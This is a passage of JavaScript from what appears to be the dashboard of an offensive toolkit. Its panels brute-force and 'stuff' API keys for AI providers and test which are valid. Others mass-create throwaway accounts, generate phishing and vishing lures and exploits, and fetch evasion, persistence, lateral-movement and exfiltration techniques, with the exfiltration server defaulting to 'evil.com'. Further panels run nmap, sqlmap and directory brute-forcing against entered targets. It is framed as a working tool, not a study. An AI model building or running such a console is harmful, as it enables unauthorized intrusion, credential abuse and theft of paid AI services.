                    document.getElementById('rotation-generated').textContent = data.stats.total_generated || 0;
                    document.getElementById('rotation-tested').textContent = data.stats.total_tested || 0;
                    document.getElementById('rotation-valid').textContent = data.stats.valid_keys_found || 0;
                    document.getElementById('rotation-rate-limited').textContent = data.stats.rate_limited_count || 0;
                    
                    // Update mode display
                    document.getElementById('rotation-mode-display').textContent = data.generation_mode || '-';
                    
                    // Update generation breakdown
                    if (data.stats.by_mode) {
                        document.getElementById('gen-leaked').textContent = data.stats.by_mode.leaked || 0;
                        document.getElementById('gen-stuffed').textContent = data.stats.by_mode.stuffing || 0;
                        document.getElementById('gen-random').textContent = data.stats.by_mode.random || 0;
                    }
                    
                    // Update status
                    if (data.running) {
                        document.getElementById('rotation-running').textContent = data.paused ? 'Paused' : 'Running';
                        document.getElementById('rotation-running').style.color = data.paused ? '#ffff00' : '#00ff00';
                    } else {
                        document.getElementById('rotation-running').textContent = 'Stopped';
                        document.getElementById('rotation-running').style.color = '#ff6600';
                        
                        // Stop polling if not running
                        if (rotationStatusInterval) {
                            clearInterval(rotationStatusInterval);
                            rotationStatusInterval = null;
                        }
                        document.getElementById('rotation-start-btn').disabled = false;
                        document.getElementById('rotation-stop-btn').disabled = true;
                    }
                    
                    // Update logs
                    if (data.logs && data.logs.length > 0) {
                        const logsDiv = document.getElementById('rotation-logs');
                        logsDiv.innerHTML = data.logs.map(log => {
                            const color = log.level === 'success' ? '#00ff00' : (log.level === 'error' ? '#ff3333' : '#888');
                            return `<div style="color: ${color};">${log.message}</div>`;
                        }).join('');
                        logsDiv.scrollTop = logsDiv.scrollHeight;
                    }
                    
                    // Update found keys display
                    if (data.valid_keys && Object.keys(data.valid_keys).length > 0) {
                        const foundKeysDiv = document.getElementById('rotation-found-keys');
                        const keysListDiv = document.getElementById('rotation-keys-list');
                        foundKeysDiv.style.display = 'block';
                        
                        // Fetch full keys
                        const keysResponse = await fetch('/_dash/rotation/keys');
                        const keysData = await keysResponse.json();
                        
                        if (keysData.success && keysData.keys) {
                            let html = '';
                            for (const [provider, keys] of Object.entries(keysData.keys)) {
                                keys.forEach(keyObj => {
                                    const key = keyObj.key;
                                    html += `
                                        <div style="display: flex; align-items: center; gap: 5px; margin-bottom: 3px; padding: 4px; background: #1a2a1a; border-radius: 3px;">
                                            <span style="color: #00ff00; font-weight: bold; width: 80px;">${provider.toUpperCase()}</span>
                                            <span style="flex: 1; color: #00ff00; word-break: break-all;">${key.substring(0, 30)}...</span>
                                            <button onclick="copyText('${key}')" style="padding: 2px 6px; background: #333; border: none; color: #fff; cursor: pointer; font-size: 9px;">📋</button>
                                        </div>
                                    `;
                                });
                            }
                            keysListDiv.innerHTML = html;
                        }
                    }
                }
            } catch (e) {
                console.error('Status update error:', e);
            }
        }

        // ==================== API KEY GENERATOR FUNCTIONS ====================
        
        async function generateAPIKey() {
            const provider = document.getElementById('keygen-provider').value;
            const count = parseInt(document.getElementById('keygen-count').value) || 1;
            
            addLog(`[KEYGEN] 🔧 Generating ${count} ${provider.toUpperCase()} key(s)...`);
            
            try {
                const response = await fetch('/_dash/keygen/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ provider, count })
                });
                
                const data = await response.json();
                const outputDiv = document.getElementById('generated-keys-output');
                outputDiv.style.display = 'block';
                
                if (data.success) {
                    if (data.key) {
                        // Single key
                        outputDiv.innerHTML = `
                            <div style="display: flex; align-items: center; gap: 10px; padding: 8px; background: #1a1a2e; border-radius: 4px; margin-bottom: 5px;">
                                <span style="color: #ff6600; font-weight: bold;">${provider.toUpperCase()}</span>
                                <span style="flex: 1; color: #00ff00; word-break: break-all;">${data.key}</span>
                                <button onclick="copyText('${data.key}')" style="padding: 4px 8px; background: #333; border: none; color: #fff; cursor: pointer; font-size: 10px;">📋</button>
                            </div>
                        `;
                        addLog(`[KEYGEN] ✅ Generated: ${data.key.substring(0, 20)}...`);
                    } else if (data.keys) {
                        // Multiple keys
                        let html = '';
                        data.keys.forEach((key, i) => {
                            html += `
                                <div style="display: flex; align-items: center; gap: 10px; padding: 8px; background: #1a1a2e; border-radius: 4px; margin-bottom: 5px;">
                                    <span style="color: #ff6600; font-weight: bold; width: 30px;">#${i+1}</span>
                                    <span style="flex: 1; color: #00ff00; word-break: break-all; font-size: 10px;">${key}</span>
                                    <button onclick="copyText('${key}')" style="padding: 4px 8px; background: #333; border: none; color: #fff; cursor: pointer; font-size: 10px;">📋</button>
                                </div>
                            `;
                        });
                        outputDiv.innerHTML = html;
                        addLog(`[KEYGEN] ✅ Generated ${data.keys.length} keys`);
                    }
                } else {
                    outputDiv.innerHTML = `<span style="color: #ff3333;">Error: ${data.error}</span>`;
                }
            } catch (e) {
                addLog(`[KEYGEN] ❌ Error: ${e.message}`);
            }
        }
        
        async function generateBatchKeys() {
            addLog('[KEYGEN] 📦 Generating keys for all providers...');
            
            try {
                const response = await fetch('/_dash/keygen/batch', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        providers: ['openai', 'anthropic', 'groq', 'huggingface', 'together', 'mistral', 'openrouter', 'cerebras', 'deepinfra', 'fireworks', 'cohere', 'replicate', 'perplexity', 'deepseek', 'google'],
                        count_per_provider: 1
                    })
                });
                
                const data = await response.json();
                const outputDiv = document.getElementById('generated-keys-output');
                outputDiv.style.display = 'block';
                
                if (data.success) {
                    let html = '<div style="margin-bottom: 10px; color: #ff6600; font-weight: bold;">🔑 Keys for All Providers:</div>';
                    
                    for (const [provider, keys] of Object.entries(data.keys)) {
                        const key = keys[0];
                        html += `
                            <div style="display: flex; align-items: center; gap: 10px; padding: 6px; background: #1a1a2e; border-radius: 4px; margin-bottom: 3px;">
                                <span style="color: #ff6600; font-weight: bold; width: 90px; font-size: 10px;">${provider.toUpperCase()}</span>
                                <span style="flex: 1; color: #00ff00; word-break: break-all; font-size: 9px;">${key}</span>
                                <button onclick="copyText('${key}')" style="padding: 2px 6px; background: #333; border: none; color: #fff; cursor: pointer; font-size: 9px;">📋</button>
                            </div>
                        `;
                    }
                    outputDiv.innerHTML = html;
                    addLog(`[KEYGEN] ✅ Generated keys for ${Object.keys(data.keys).length} providers`);
                } else {
                    outputDiv.innerHTML = `<span style="color: #ff3333;">Error: ${data.error}</span>`;
                }
            } catch (e) {
                addLog(`[KEYGEN] ❌ Error: ${e.message}`);
            }
        }

        async function generateCredentials() {
            addLog('[HARVESTER] 🎲 Generating temp email and password...');
            
            try {
                const response = await fetch('/_dash/harvest/generate-credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('generated-email').value = data.email;
                    document.getElementById('generated-password').value = data.password;
                    currentCredentials = {
                        email: data.email,
                        password: data.password,
                        token: data.token,
                        provider: data.email_provider
                    };
                    
                    addLog(`[HARVESTER] ✅ Email: ${data.email}`);
                    addLog(`[HARVESTER] ✅ Password: ${data.password}`);
                    addLog(`[HARVESTER] 📧 Provider: ${data.email_provider}`);
                    addLog('[HARVESTER] 👉 Copy these and use them to sign up!');
                } else {
                    addLog(`[HARVESTER] ❌ Error: ${data.error}`);
                }
            } catch (error) {
                addLog(`[HARVESTER] ❌ Error: ${error.message}`);
            }
        }

        async function checkTempEmail() {
            if (!currentCredentials.email) {
                addLog('[HARVESTER] ❌ Generate credentials first!');
                alert('Generate credentials first!');
                return;
            }
            
            addLog('[HARVESTER] 📬 Checking inbox...');
            document.getElementById('email-inbox').style.display = 'block';
            document.getElementById('email-inbox').innerHTML = '<span style="color: #888;">Checking...</span>';
            
            try {
                const response = await fetch('/_dash/harvest/check-email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: currentCredentials.email,
                        token: currentCredentials.token,
                        provider: currentCredentials.provider
                    })
                });
                
                const data = await response.json();
                
                if (data.success && data.messages && data.messages.length > 0) {
                    let html = '<div style="color: #00ff00; margin-bottom: 10px;">📬 ' + data.messages.length + ' message(s) found:</div>';
                    data.messages.forEach((msg, i) => {
                        html += `<div style="padding: 8px; background: #1a1a2e; margin-bottom: 5px; border-radius: 3px;">
                            <div style="color: #ff6600;">${msg.subject || 'No Subject'}</div>
                            <div style="color: #888; font-size: 10px;">From: ${msg.from || 'Unknown'}</div>
                            ${msg.verification_link ? `<a href="${msg.verification_link}" target="_blank" style="color: #00ff00;">🔗 Verification Link</a>` : ''}
                        </div>`;
                    });
                    document.getElementById('email-inbox').innerHTML = html;
                    addLog(`[HARVESTER] ✅ Found ${data.messages.length} email(s)`);
                } else {
                    document.getElementById('email-inbox').innerHTML = '<span style="color: #888;">No emails yet. Try again in a few seconds...</span>';
                    addLog('[HARVESTER] 📭 No emails yet');
                }
            } catch (error) {
                document.getElementById('email-inbox').innerHTML = '<span style="color: #ff0000;">Error checking email</span>';
                addLog(`[HARVESTER] ❌ Error: ${error.message}`);
            }
        }

        function openProviderSignup() {
            const provider = document.getElementById('harvest-provider').value;
            const urls = providerUrls[provider];
            if (urls) {
                addLog(`[HARVESTER] 🌐 Opening ${provider.toUpperCase()} signup page...`);
                addLog(`[HARVESTER] 👉 Use the email and password generated above!`);
                window.open(urls.signup, '_blank');
            } else {
                addLog(`[HARVESTER] ❌ Unknown provider: ${provider}`);
            }
        }

        function openProviderKeys() {
            const provider = document.getElementById('harvest-provider').value;
            const urls = providerUrls[provider];
            if (urls) {
                addLog(`[HARVESTER] 🔑 Opening ${provider.toUpperCase()} API keys page...`);
                window.open(urls.keys, '_blank');
            } else {
                addLog(`[HARVESTER] ❌ Unknown provider: ${provider}`);
            }
        }

        async function saveManualKey() {
            const provider = document.getElementById('harvest-provider').value;
            const apiKey = document.getElementById('manual-api-key').value.trim();
            
            if (!apiKey) {
                addLog('[HARVESTER] ❌ Please paste an API key first');
                alert('Please paste an API key first!');
                return;
            }
            
            addLog(`[HARVESTER] 💾 Saving ${provider.toUpperCase()} key...`);
            
            try {
                const response = await fetch('/_dash/harvest/save-key', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        provider: provider, 
                        key: apiKey,
                        email: currentCredentials.email || 'manual_entry',
                        is_real: true,
                        method: 'manual'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    addLog(`[HARVESTER] ✅ ${provider.toUpperCase()} key saved successfully!`);
                    addLog(`[HARVESTER] Key: ${apiKey.substring(0, 15)}...${apiKey.slice(-5)}`);
                    document.getElementById('manual-api-key').value = '';
                    loadHarvestedKeys();
                    addMessage('system', `✅ ${provider.toUpperCase()} API key saved! Click "Apply Keys to Session" to activate.`);
                } else {
                    addLog(`[HARVESTER] ❌ Error: ${data.error}`);
                }
            } catch (error) {
                addLog(`[HARVESTER] ❌ Error saving key: ${error.message}`);
            }
        }

        // Harvesting Functions
        let harvestInterval = null;

        async function startHarvesting() {
            const provider = document.getElementById('harvest-provider').value;
            const btn = document.getElementById('harvest-btn');
            
            btn.disabled = true;
            btn.textContent = '⏳ STARTING VNC & BROWSER...';
            
            addLog(`[HARVESTER] Starting harvesting for ${provider}`);
            addLog('[HARVESTER] Initializing VNC for manual CAPTCHA solving...');
            
            try {
                const response = await fetch('/_dash/harvest/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ provider, headless: false })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    addLog('[HARVESTER] ✓ Harvesting initiated');
                    addLog('[HARVESTER] 📺 Browser visible in VNC tab!');
                    addLog('[HARVESTER] 👉 Switch to VNC tab when prompted for manual action');
                    
                    btn.textContent = '⏳ HARVESTING IN PROGRESS...';
                    
                    // Show notification about VNC
                    addMessage('system', '📺 Browser is now visible! Go to VNC tab to see it and solve any CAPTCHAs.');
                    
                    // Start polling for status updates
                    harvestInterval = setInterval(updateHarvestStatus, 1000);
                    
                    // Refresh VNC iframe
                    setTimeout(() => {
                        const vncFrame = document.getElementById('vnc-frame');
                        if (vncFrame) vncFrame.src = '/_vnc/vnc.html';
                    }, 2000);
                } else {
                    addLog(`[HARVESTER] Error: ${data.error}`);
                    btn.disabled = false;
                    btn.textContent = '🚀 START AUTONOMOUS HARVESTING';
                }
            } catch (error) {
                addLog(`[HARVESTER] Error: ${error.message}`);
                btn.disabled = false;
                btn.textContent = '🚀 START AUTONOMOUS HARVESTING';
            }
        }

        async function updateHarvestStatus() {
            try {
                const response = await fetch('/_dash/harvest/status');
                const status = await response.json();
                
                // Update status display
                document.getElementById('harvest-status').textContent = status.active ? 'Active' : 'Idle';
                document.getElementById('harvest-phase').textContent = status.phase || '-';
                document.getElementById('harvest-progress').textContent = status.progress + '%';
                document.getElementById('harvest-progress-bar').style.width = status.progress + '%';
                document.getElementById('harvest-progress-bar').textContent = status.progress + '%';
                
                // Update log
                const logDiv = document.getElementById('harvest-log');
                logDiv.textContent = status.logs.join('\\n');
                logDiv.scrollTop = logDiv.scrollHeight;
                
                // Check if complete
                if (!status.active && status.progress === 100) {
                    clearInterval(harvestInterval);
                    document.getElementById('harvest-btn').disabled = false;
                    document.getElementById('harvest-btn').textContent = '🚀 START AUTONOMOUS HARVESTING';
                    
                    addLog('[HARVESTER] ✓ Harvesting complete!');
                    if (status.api_key) {
                        addMessage('system', `API Key harvested successfully: ${status.api_key.substring(0, 20)}...`);
                        addMessage('system', 'Click "APPLY KEYS TO SESSION" to activate');
                        loadHarvestedKeys();
                    }
                } else if (status.error) {
                    clearInterval(harvestInterval);
                    document.getElementById('harvest-btn').disabled = false;
                    document.getElementById('harvest-btn').textContent = '🚀 START AUTONOMOUS HARVESTING';
                    addLog(`[HARVESTER] ✗ Error: ${status.error}`);
                }
            } catch (error) {
                console.error('Status update error:', error);
            }
        }

        async function loadHarvestedKeys() {
            try {
                const response = await fetch('/_dash/harvest/keys');
                const data = await response.json();
                
                const listDiv = document.getElementById('harvested-keys-list');
                if (data.keys && data.keys.length > 0) {
                    listDiv.innerHTML = data.keys.map(k => 
                        `<div style="padding: 3px; border-bottom: 1px solid #333;">
                            <span style="color: #00ff00;">✓</span> 
                            <strong>${k.provider}</strong>: ${k.key.substring(0, 15)}... 
                            <span style="color: #666; font-size: 10px;">(${k.harvested_at})</span>
                        </div>`
                    ).join('');
                } else {
                    listDiv.innerHTML = '<div style="color: #666;">No keys harvested yet</div>';
                }
            } catch (error) {
                document.getElementById('harvested-keys-list').innerHTML = '<div style="color: #ff0000;">Error loading keys</div>';
            }
        }

        async function applyHarvestedKeys() {
            addLog('[SYSTEM] Applying harvested keys to active session...');
            
            try {
                const response = await fetch('/_dash/harvest/apply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const data = await response.json();
                
                if (data.success) {
                    addLog('[SYSTEM] ✓ Keys applied successfully!');
                    addLog(`[SYSTEM] Active providers: ${data.active_count}/${data.total_count}`);
                    addMessage('system', 'API keys loaded into session. AI providers are now active!');
                    checkSystemStatus();
                } else {
                    addLog(`[SYSTEM] ✗ Error: ${data.error}`);
                }
            } catch (error) {
                addLog(`[SYSTEM] ✗ Error: ${error.message}`);
            }
        }

        async function restartBackend() {
            addLog('[SYSTEM] Restarting backend services...');
            
            try {
                const response = await fetch('/_dash/system/restart', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const data = await response.json();
                
                if (data.success) {
                    addLog('[SYSTEM] ✓ Backend restart initiated');
                    addMessage('system', 'Backend restarting... Please wait 5 seconds.');
                    
                    setTimeout(() => {
                        checkSystemStatus();
                        addLog('[SYSTEM] ✓ Backend restart complete');
                    }, 5000);
                } else {
                    addLog(`[SYSTEM] ✗ Error: ${data.error}`);
                }
            } catch (error) {
                addLog(`[SYSTEM] ✗ Error: ${error.message}`);
            }
        }

        // Load harvested keys on page load
        setTimeout(loadHarvestedKeys, 2000);

        // ==================== VNC/SCREENSHOT FUNCTIONS ====================
        
        let autoScreenshotInterval = null;
        
        async function takeScreenshot() {
            try {
                const response = await fetch('/_dash/browser/screenshot');
                const data = await response.json();
                
                if (data.success && data.image) {
                    const img = document.getElementById('browser-screenshot');
                    const placeholder = document.getElementById('screenshot-placeholder');
                    
                    img.src = 'data:image/png;base64,' + data.image;
                    img.style.display = 'block';
                    placeholder.style.display = 'none';
                    
                    document.getElementById('screenshot-time').textContent = new Date().toLocaleTimeString();
                    addLog('[SCREENSHOT] Browser screenshot captured');
                } else {
                    addLog('[SCREENSHOT] ' + (data.error || 'No active browser'));
                }
            } catch (e) {
                addLog('[SCREENSHOT] Error: ' + e.message);
            }
        }
        
        function toggleAutoScreenshot() {
            const btn = document.getElementById('auto-screenshot-btn');
            
            if (autoScreenshotInterval) {
                clearInterval(autoScreenshotInterval);
                autoScreenshotInterval = null;
                btn.textContent = '🔄 Auto-Refresh: OFF';
                btn.style.background = '';
                addLog('[SCREENSHOT] Auto-refresh disabled');
            } else {
                takeScreenshot(); // Take one immediately
                autoScreenshotInterval = setInterval(takeScreenshot, 3000); // Every 3 seconds
                btn.textContent = '🔄 Auto-Refresh: ON';
                btn.style.background = '#1a4d1a';
                addLog('[SCREENSHOT] Auto-refresh enabled (every 3s)');
            }
        }
        
        async function checkVNCStatus() {
            try {
                const response = await fetch('/_dash/vnc/status');
                const data = await response.json();
                const statusEl = document.getElementById('vnc-status');
                
                if (data.running) {
                    statusEl.textContent = '✓ Browser Active';
                    statusEl.style.color = '#00ff00';
                } else {
                    statusEl.textContent = '✗ No Active Browser';
                    statusEl.style.color = '#ff0000';
                }
            } catch (e) {
                document.getElementById('vnc-status').textContent = '? Unknown';
            }
        }
        
        // Check status periodically
        setInterval(checkVNCStatus, 10000);
        setTimeout(checkVNCStatus, 1000);

        // ==================== ADVANCED CAPABILITIES FUNCTIONS ====================
        
        function showAdvancedResult(data) {
            const resultsEl = document.getElementById('advanced-output');
            resultsEl.textContent = JSON.stringify(data, null, 2);
        }

        async function runPassiveRecon() {
            const target = document.getElementById('recon-target').value;
            if (!target) { alert('Enter target domain'); return; }
            
            showAdvancedResult({status: 'Running passive recon on ' + target + '...'});
            
            try {
                const response = await fetch('/_dash/capabilities/recon/passive', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runActiveRecon() {
            const target = document.getElementById('recon-target').value;
            if (!target) { alert('Enter target domain'); return; }
            
            showAdvancedResult({status: 'Running active recon on ' + target + '...'});
            
            try {
                const response = await fetch('/_dash/capabilities/recon/active', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runFullRecon() {
            const target = document.getElementById('recon-target').value;
            if (!target) { alert('Enter target domain'); return; }
            
            showAdvancedResult({status: 'Running FULL recon suite on ' + target + '...'});
            
            try {
                const response = await fetch('/_dash/capabilities/recon/full', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function genPhishing() {
            const name = document.getElementById('phish-name').value || 'Target User';
            const company = document.getElementById('phish-company').value || 'Target Company';
            
            showAdvancedResult({status: 'Generating phishing campaign...'});
            
            try {
                const response = await fetch('/_dash/capabilities/nlp/phishing', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target_info: {name, company}})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function genVishing() {
            const name = document.getElementById('phish-name').value || 'Target User';
            const company = document.getElementById('phish-company').value || 'Target Company';
            
            try {
                const response = await fetch('/_dash/capabilities/nlp/vishing', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target_info: {name, company}})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runAnomalyDetection() {
            let data;
            try {
                data = JSON.parse(document.getElementById('ml-data').value || '[]');
            } catch (e) {
                showAdvancedResult({error: 'Invalid JSON data'});
                return;
            }
            
            try {
                const response = await fetch('/_dash/capabilities/ml/anomaly', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({data: data})
                });
                const result = await response.json();
                showAdvancedResult(result);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function analyzeHash() {
            const hash = document.getElementById('hash-input').value;
            if (!hash) { alert('Enter a hash to analyze'); return; }
            
            try {
                const response = await fetch('/_dash/capabilities/crypto/analyze', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({hash: hash})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function generateKeys() {
            try {
                const response = await fetch('/_dash/capabilities/crypto/keygen', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({algorithm: 'AES', bits: 256})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function generateExploit() {
            const vulnType = document.getElementById('exploit-type').value;
            
            try {
                const response = await fetch('/_dash/capabilities/exploit/generate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({vuln_type: vulnType, target_info: {}})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getEvasionTechniques() {
            addLog('[ADVANCED] 🛡️ Fetching defense evasion techniques...');
            try {
                const os = document.getElementById('advanced-os-select')?.value || 'all';
                const response = await fetch('/_dash/advanced/evasion?os=' + os);
                const data = await response.json();
                if (data.success) {
                    addLog('[ADVANCED] ✅ Found evasion techniques');
                    displayAdvancedAttackResult('Defense Evasion', data.techniques);
                } else {
                    showAdvancedResult(data);
                }
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getPersistence() {
            addLog('[ADVANCED] 🔒 Fetching persistence techniques...');
            const lhost = document.getElementById('advanced-lhost')?.value || '10.10.10.10';
            const lport = parseInt(document.getElementById('advanced-lport')?.value) || 4444;
            const os = document.getElementById('advanced-os-select')?.value || 'all';
            
            try {
                const response = await fetch('/_dash/advanced/persistence', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lhost: lhost, lport: lport, os: os})
                });
                const data = await response.json();
                if (data.success) {
                    addLog('[ADVANCED] ✅ Found ' + data.technique_count + ' persistence techniques');
                    displayAdvancedAttackResult('Persistence (LHOST: ' + lhost + ':' + lport + ')', data.techniques);
                } else {
                    showAdvancedResult(data);
                }
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getLateralMovement() {
            addLog('[ADVANCED] 🔀 Fetching lateral movement techniques...');
            const target = document.getElementById('advanced-target')?.value || '192.168.1.100';
            const username = document.getElementById('advanced-username')?.value || 'administrator';
            const password = document.getElementById('advanced-password')?.value || 'password';
            
            try {
                const response = await fetch('/_dash/advanced/lateral', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target, username: username, password: password})
                });
                const data = await response.json();
                if (data.success) {
                    addLog('[ADVANCED] ✅ Found ' + data.technique_count + ' lateral movement techniques');
                    displayAdvancedAttackResult('Lateral Movement (Target: ' + target + ')', data.techniques);
                } else {
                    showAdvancedResult(data);
                }
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getExfiltration() {
            addLog('[ADVANCED] 📤 Fetching exfiltration techniques...');
            const server = document.getElementById('advanced-exfil-server')?.value || 'evil.com';
            
            try {
                const response = await fetch('/_dash/advanced/exfil', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({server: server})
                });
                const data = await response.json();
                if (data.success) {
                    addLog('[ADVANCED] ✅ Found ' + data.technique_count + ' exfiltration techniques');
                    displayAdvancedAttackResult('Exfiltration (Server: ' + server + ')', data.techniques);
                } else {
                    showAdvancedResult(data);
                }
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        function displayAdvancedAttackResult(title, techniques) {
            const output = document.getElementById('advanced-output');
            let html = '<div style="color: #ff0000; font-weight: bold; margin-bottom: 10px; font-size: 16px;">💀 ' + title + '</div>';
            
            for (const [osType, osTechniques] of Object.entries(techniques)) {
                html += '<div style="color: #ffff00; margin: 10px 0 5px 0; font-weight: bold;">📌 ' + osType.toUpperCase() + '</div>';
                
                for (const [techName, techData] of Object.entries(osTechniques)) {
                    html += '<div style="background: #1a1a2e; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 3px solid #ff0066;">';
                    html += '<div style="color: #ff0066; font-weight: bold;">' + (techData.name || techName) + '</div>';
                    if (techData.description) {
                        html += '<div style="color: #888; font-size: 11px; margin: 3px 0;">' + techData.description + '</div>';
                    }
                    
                    if (techData.commands) {
                        html += '<div style="margin-top: 8px;">';
                        for (const [cmdName, cmdValue] of Object.entries(techData.commands)) {
                            if (typeof cmdValue === 'string') {
                                html += '<div style="margin: 4px 0;"><span style="color: #00ff88;">' + cmdName + ':</span>';
                                html += '<pre style="margin: 2px 0; padding: 5px; background: #000; color: #0f0; font-size: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all;">' + escapeHtml(cmdValue) + '</pre></div>';
                            }
                        }
                        html += '</div>';
                    }
                    
                    if (techData.techniques) {
                        html += '<div style="margin-top: 8px;">';
                        for (const [techKey, techVal] of Object.entries(techData.techniques)) {
                            if (typeof techVal === 'string') {
                                html += '<div style="margin: 4px 0;"><span style="color: #00ff88;">' + techKey + ':</span>';
                                html += '<pre style="margin: 2px 0; padding: 5px; background: #000; color: #0f0; font-size: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all;">' + escapeHtml(techVal) + '</pre></div>';
                            }
                        }
                        html += '</div>';
                    }
                    
                    if (techData.cleanup) {
                        html += '<div style="margin-top: 5px; color: #ff6600; font-size: 10px;">🧹 Cleanup: ' + escapeHtml(techData.cleanup) + '</div>';
                    }
                    
                    html += '</div>';
                }
            }
            
            output.innerHTML = html;
            output.scrollTop = 0;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        async function getWirelessAttacks() {
            try {
                const response = await fetch('/_dash/capabilities/wireless/attacks');
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getPhysicalBypass() {
            try {
                const response = await fetch('/_dash/capabilities/physical/bypass');
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function analyzeSupplyChain() {
            const target = document.getElementById('supply-target').value || 'target';
            
            try {
                const response = await fetch('/_dash/capabilities/supply-chain/analyze', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getZeroDayMethodology() {
            try {
                const response = await fetch('/_dash/capabilities/zeroday/methodology');
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        // New Offensive Tools Functions
        async function runNmapScan() {
            const target = document.getElementById('offensive-target').value;
            if (!target) { alert('Enter target IP/domain'); return; }
            
            showAdvancedResult({status: 'Running Nmap scan on ' + target + '...'});
            
            try {
                const response = await fetch('/_dash/offensive/nmap/quick', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runSQLMapTest() {
            const target = document.getElementById('offensive-target').value;
            if (!target) { alert('Enter target URL'); return; }
            
            const url = target.includes('://') ? target : 'http://' + target;
            showAdvancedResult({status: 'Testing SQL injection on ' + url + '...'});
            
            try {
                const response = await fetch('/_dash/offensive/sqlmap/test', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: url})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runDirBrute() {
            const target = document.getElementById('offensive-target').value;
            if (!target) { alert('Enter target URL'); return; }
            
            const url = target.includes('://') ? target : 'http://' + target;
            showAdvancedResult({status: 'Brute forcing directories on ' + url + '...'});
            
            try {
                const response = await fetch('/_dash/offensive/dirs/brute', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: url})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        // ==================== NETWORK CAPTURE FUNCTIONS ====================
        
        async function startCapture() {
            const filter = document.getElementById('capture-filter').value;
            const count = parseInt(document.getElementById('capture-count').value) || 100;
            
            showAdvancedResult({status: 'Starting packet capture...', filter: filter, count: count});
            addLog('[NETWORK] Starting packet capture...');
            
            try {
                const response = await fetch('/_dash/network/capture/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({filter: filter, count: count, timeout: 60})
                });
                const data = await response.json();
                showAdvancedResult(data);
                addLog('[NETWORK] ' + (data.success ? 'Capture started' : 'Error: ' + data.error));
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        async function getCaptureStatus() {
            try {
                const response = await fetch('/_dash/network/capture/status');
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
